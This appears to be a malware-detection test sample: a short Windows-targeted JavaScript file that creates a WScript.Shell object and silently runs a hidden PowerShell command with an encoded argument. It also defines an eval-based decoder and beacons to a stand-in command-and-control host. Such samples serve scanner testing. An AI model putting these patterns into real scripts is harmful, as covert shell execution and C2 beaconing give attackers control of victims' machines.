// Malicious JavaScript test file
var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

function decode(encoded) {
    return eval(String.fromCharCode.apply(null, encoded));
}

var payload = "cmd.exe /c powershell -enc JABjAGwAaQBlAG4AdAA=";
shell.Run(payload, 0, false);

var xhr = new XMLHttpRequest();
xhr.open("GET", "http://malware-c2.example.com/beacon", true);
xhr.send();
